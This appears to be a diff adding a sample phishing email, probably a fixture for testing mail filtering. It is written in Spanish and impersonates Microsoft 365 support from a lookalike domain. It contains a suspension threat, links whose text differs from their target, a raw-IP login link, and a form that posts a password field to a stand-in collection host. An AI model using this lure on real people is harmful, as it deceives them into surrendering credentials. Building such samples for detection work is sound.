@@ -1,0 +1,37 @@
+From: "Soporte Microsoft 365" <soporte@micr0soft-seguridad.example>
+To: agomez@corp.example
+Subject: Tu cuenta =?utf-8?q?ser=C3=A1?= suspendida: verifica tu identidad
+Date: Mon, 02 Nov 2026 10:45:00 +0000
+Message-ID: <a77e@micr0soft-seguridad.example>
+Authentication-Results: mx.corp.example; spf=pass
+ smtp.mailfrom=micr0soft-seguridad.example; dkim=pass
+ header.d=micr0soft-seguridad.example; dmarc=pass
+ header.from=micr0soft-seguridad.example
+Received: from mx.corp.example ([10.20.1.25]) by mailgw.corp.example; Mon, 02
+ Nov 2026 10:47:00 +0000
+Received: from srv.micr0soft-seguridad.example ([203.0.113.77]) by
+ mx.corp.example; Mon, 02 Nov 2026 10:46:58 +0000
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============4097974116827675576=="
+
+--===============4097974116827675576==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Verifica tu cuenta: https://login.microsoft.com.cuenta-segura.example/verific=
+ar
+
+--===============4097974116827675576==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body><p>Detectamos actividad inusual. <b>Inicia sesi=C3=B3n</b> para v=
+erificar tu cuenta en las pr=C3=B3ximas 24 horas o ser=C3=A1 bloqueada.</p><p=
+><a href=3D"https://login.micr0soft-seguridad.example/verify?u=3Dagomez">http=
+s://login.microsoft.com/verificar</a></p><p><a href=3D"http://203.0.113.77/ow=
+a/login.php">Acceso alternativo</a></p><form action=3D"https://recolector.exa=
+mple/post" method=3D"post"><input name=3D"pass"></form></body></html>
+
+--===============4097974116827675576==--
